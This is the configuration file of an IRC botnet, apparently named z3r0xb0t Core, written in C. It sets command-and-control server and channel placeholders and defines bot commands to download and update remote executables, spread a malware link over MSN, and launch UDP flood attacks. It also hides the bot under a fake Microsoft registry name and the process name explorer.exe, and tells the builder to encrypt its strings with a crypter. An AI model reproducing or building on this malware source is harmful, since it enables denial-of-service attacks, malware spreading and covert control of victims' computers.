#include "externs.h"
unsigned long cfg_reconnectsleep = 5000; // msec
unsigned long cfg_ircmaxwaittime = 600; // sec

char cfg_mutex[] = "PUT A RANDOM NUMBER HERE CHANGE EVERY COMPILE";

//EVERYTHING DOWN HERE MUST BE CRYPTED WITH THE CRYPTER & EVERYTHING IS CASE SENSITIVE!
char cfg_host[] = "DNS 1 HERE";
char cfg_bhost[] = "DNS 2 HERE";
char cfg_srvpass[] = "SERVER PASSWORD HERE";
unsigned short cfg_port = 6667; // PORT HERE
char cfg_channel[] = "#CHANNEL HERE";      
char cfg_chanpass[] = "CHANNEL PASSWORD HERE";
char cfg_hiddenc[] = "#HIDDEN CHANNEL PASSWORD HERE";
char cfg_hiddenp[] = "HIDDEN PASSWORD HERE";
char cfg_protectp[] = "PROTECT PASSWORD HERE";
char cfg_password[] = "LOGIN PASSWORD HERE";
char cfg_p[] = "!";
char cversion[]  = "PUT YOUR ENCRYPTIONKEYHERE";


BOOL logged_in = FALSE;
BOOL privlogged = FALSE;
BOOL silenced = TRUE; 
BOOL TopicCommand = FALSE; //TO BE FINISHED


//commands
char cmd_join[] = "join";			//join a channel. ex: !join #channel
char cmd_leave[] = "leave";			//leave a channel. ex: !leave #channel
char cmd_dc[] = "dc";               //cycle from the channel for X time
char cmd_protect[] = "protect";	    //Protect channel ex: !dc 10
char cmd_download[] = "download";	//download something. ex: !download http://www.site.com/file.exe output.exe
char cmd_update[] = "update";       //update your bot ex: !download http://www.site.com/file.exe output.exe
char cmd_uninstall[] = "remove";	//remove the bot. ex: !remove ALL/4342
char cmd_login[] = "login";         //Login in your bots ex: !login PASSWORD
char cmd_logout[] = "logout";       //logout ex: !logout
char cmd_plogin[] = "privlogin";    //Login when in private channel ex: !privlogin channel
char cmd_silence[] = "silence";     //Slience/Unsilence your bot ex: !silence 1/0
char cmd_visit[] = "visit";         //Visit a webpage ex: !visit http://youporn.com
char cmd_msnspread[] = "msn";       //Spread using msn ex: !msn Downlaod this shit http://youpornbitches.com/virus.exe
char cmd_udp[] = "udp";             //Launch a UDP attack ex: !udp IP Port NumberOfPackets PacketSize Delay(Seconds Timeout(Seconds)
char cmd_crypted[] = "crypted";     


char szRegname[]	    	= "Microsoft Windows Hosting Service Login";		//Eegistry name
char gotopth[]				= "%temp%";											//Don't change, this works in every windows version
char exename[]				= "explorer.exe";									//This is the name that will appear in the registry and the task manager
char core[]                 = "|gr{kel";                                        //If you change this everyhing will go boom lol

//msn stuff
char msn_sendmsg[512]		= "";

char version[] = "2.0";
/* Changelog:
This is the final release of z3r0xb0t Core. Please do not attempt to rip this.
*/
